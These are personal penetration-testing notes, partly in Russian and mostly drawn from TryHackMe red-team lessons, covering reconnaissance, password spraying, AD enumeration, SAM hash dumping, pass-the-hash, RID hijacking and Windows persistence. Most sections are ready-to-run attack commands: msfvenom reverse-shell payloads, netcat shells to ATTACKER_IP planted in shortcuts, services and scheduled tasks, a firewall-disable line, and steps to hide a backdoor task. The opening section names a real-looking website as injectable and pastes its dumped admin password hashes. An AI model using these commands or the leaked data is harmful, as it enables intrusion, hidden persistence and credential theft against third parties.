Themes for Repeaat:
1) Enumeration(linux, windows)
2) Which i learn new tools and for what?
3) Phising with reverse shell (bypass and hidden)
4) RE-exploitation technics (rid, pstools, create new users with high priviledges)
5) enumeration domain
6) Pass The Hash (sym,system dump)


http://aminter.co.th/product2.php?id=1 - Have a SQL injection
With SQLmap I can get databases
Dump:
admin_id,admin_tel,admin_name,admin_pass,admin_email,admin_active,admin_surname,admin_ip_login,admin_username,admin_date_login,admin_date_create,admin_date_update,admin_admin_create,admin_admin_update
17,<blank>,root,cccc56525135d9fe92937ba95ea051,<blank>,Y,fundan,45.113.165.33,hiddenwiki,1665077725,NULL,1626799363,NULL,NULL
18,111,root,ea3f63fc1f898c518bdb8948191905,11@12.com,Y,1,<blank>,root,NULL,NULL,1665080826,NULL,17

Also http://aminter.co.th/signin.php have XSS vulnerability
https://vk.com/video/@c0mrade_pentest?z=video300869425_456239793%2Fpl_300869425_-2


## Api 
[+] API [+]
https://github.com/arainho/awesome-api-security



## Types of reconnaissance activities
1) WHOIS and DNS-based reconnaissance
2) Advanced searching
3) Searching by image
4) Google Hacking
5) Specialized search engines
6) Recon-ng
7) Maltego



---> Passive test
whois
dig, nslookup, host
traceroute/tracert

---> Google OSINT


"search phrase"	Find results with exact search phrase
OSINT filetype:pdf	Find files of type PDF related to a certain term.
salary site:blog.tryhackme.com	Limit search results to a specific site.
pentest -site:example.com	Exclude a specific site from results
walkthrough intitle:TryHackMe	Find pages with a specific term in the page title.
challenge inurl:tryhackme	Find pages with a specific term in the page URL.

OSINT sites/tools
-- shodan, 
-- censys, 
-- recon-ng, 
-- maltego
-- full hunt


## Red Team Rules

Activities:
• Reconnaissance
• Access Types
• Phishing
• Physical and social engineering
• Positioning
• Assumed breach scenario
• Impact

Explicit Restrictions:
• Use of white cards are strictly prohibited
• Any form of DDoS or DoS is prohibited
• Attacks against any system within 192.168.1.0/24 is prohibited
Authorized Target Space:
• 10.0.4.0/22
• *.bethechange.xyz, *.globalenterprises.thm






Below is an example of the CONOPS for a mature organization with a strong security posture.

Example 1 - Holo Enterprises:
## CONOPS:
Holo Enterprises has hired TryHackMe as an external contractor to conduct a month-long network infrastructure assessment and security posture. The campaign will utilize an assumed breach model starting in Tier 3 infrastructure. 
Operators will progressively conduct reconnaissance and attempt to meet objectives to be determined. 
If defined goals are not met, the red cell will move and escalate privileges within the network laterally. 
Operators are also expected to execute and maintain persistence to sustain for a period of three weeks. 
A trusted agent is expected to intervene if the red cell is identified or burned by the blue cell throughout the entirety of the engagement.
The last engagement day is reserved for clean-up and remediation and consultation with the blue and white cell.
The customer has requested the following training objectives: assess th



##Example urls:
https://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf
https://www.crest-approved.org/membership/tiber-eu/



TTPs  тактики техники процедуры
https://attack.mitre.org



## An HTML Application (HTA)
HTA Reverse Connection
user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta



Malicious HTA via Metasploit
msf6 > use exploit/windows/misc/hta_server


https://raw.githubusercontent.com/JohnWoodman/VBA-Macro-Reverse-Shell/main/VBA-Reverse-Shell.vba


## Passwowrd Attacks
https://default-password.info
crunch 2 2 01234abcd -o crunch.txt
git clone https://github.com/therodri2/username_generator.git

1) echo "John Smith" > users.lst
2) user@thm$ python3 username_generator.py -w users.lst


CeWL (Custom Word List generator, то есть генератор пользовательского списка слов) - это приложение на основе Ruby, которое просматривает указанный URL-адрес до указанной глубины и возвращает список слов, который затем может использоваться для взломщиков паролей, таких как John the Ripper. При желании CeWL может переходить по внешним ссылкам


## Spray Attack
Outlook web access (OWA) portal
Tools:

1)SprayingToolkit (atomizer.py)
2)MailSniper
SMB
1) Tool: Metasploit (auxiliary/scanner/smb/smb_login)




## POST exploitation (The lay of the land)

--> systeminfo | findstr Domain

BUILTIN\Administrator	Local admin access on a domain controller
Domain Admins	Administrative access to all resources in the domain
Enterprise Admins	Available only in the forest root
Schema Admins	Capable of modifying domain/forest; useful for red teamers
Server Operators	Can manage domain servers
Account Operators	Can manage users that are not in privileged groups


## Active Directory (AD) Enum

Get-ADUser  -Filter *
Get-ADUser -Filter * -SearchBase "OU=THM,DC=THMREDTEAM,DC=COM"



Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct #Get AV on machine
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False	#Get firewall settings on machine
Get-Service WinDefend


wmic service where "name like 'THM Demo'" get Name,PathName #get name,PathName

Get-Process -Name thm-demo # get proccess id

netstat -noa |findstr "LISTENING" |findstr "3212"


AD SCAN - Puple Knight





net localgroup "Remote Management Users" thmuser1 /add

evil-winrm -i MACHINE_IP -u thmuser1 -p Password321
reg save hklm\system system.bak
reg save hklm\sam sam.bak
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cea1d7e8899f69e89088c4cb4bbdaa3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9657e898170eb98b25861ef9cafe5bd6:::
thmuser1:1011:aad3b435b51404eeaad3b435b51404ee:e41fd391af74400faa4ff75868c93cce:::
Pass the Hash
evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3





SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.

secedit /export /cfg config.inf
next step move:
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
and need to allow full control

And afer we can to dump hashes (sam, system)



## Взаимодействие между RID и LSASS заключается в том, что LSASS использует RID для идентификации и проверки безопасности объектов в домене Active Directory. 
## Когда пользователь выполняет вход в систему, LSASS проверяет его учетную запись, используя RID, чтобы убедиться, что пользователь имеет право получить доступ к ресурсам и выполнить запрашиваемые операции. 

Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.

When a user is created, an identifier called Relative ID (RID) is assigned to them. The RID is simply a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.

In any Windows system, the default Administrator account is assigned the RID = 500, and regular users usually have RID >= 1000.
wmic useraccount get name,sid
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010

C:\tools\pstools> PsExec64.exe -i -s regedit

From Regedit, we will go to HKLM\SAM\SAM\Domains\Account\Users\ where there will be a key for each user in the machine. Since we want to modify thmuser3, we need to search for a key with its RID in hex (1010 = 0x3F2). Under the corresponding key, there will be a value called F, which holds the user's effective RID at position 0x30:        


## Backdooring Files

1. We're can to change shortcut files(target) for execute our reverse shell(backdoor)
backdoor.ps1  
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
target shortcut = powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1

2. Hijacking File Associations

We can then search for a subkey for the corresponding ProgID (also under HKLM\Software\Classes\), in this case, txtfile, where we will find a reference to the program in charge of handling .txt files. Most ProgID entries will have a subkey under shell\open\command where the default command to be run for files with that extension is specified:
tart-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]


## Abusing Services

1. sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
-- After start up will be changed administrators  password 
-- Also we're can to upload our executable file(reverse shell)
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2

2. Changed services binpath 
C:\> sc.exe qc THMService3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2 AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\THMService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMService3
        DEPENDENCIES       : 
        SERVICE_START_NAME : NT AUTHORITY\Local Service
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"


-- When this service will be to start our reverse shell will be run 



## Task Scheduler
We can to create our Scheduler task with Reverse shell which will to run in one minute
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
schtasks /query /tn thm-taskbackdoor #Check backdoor status


Also need to delete Security Descripter which make our reverse shell script visible
C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
and need to delete SD (security Descripter)


And our reverse shell will be to invisible


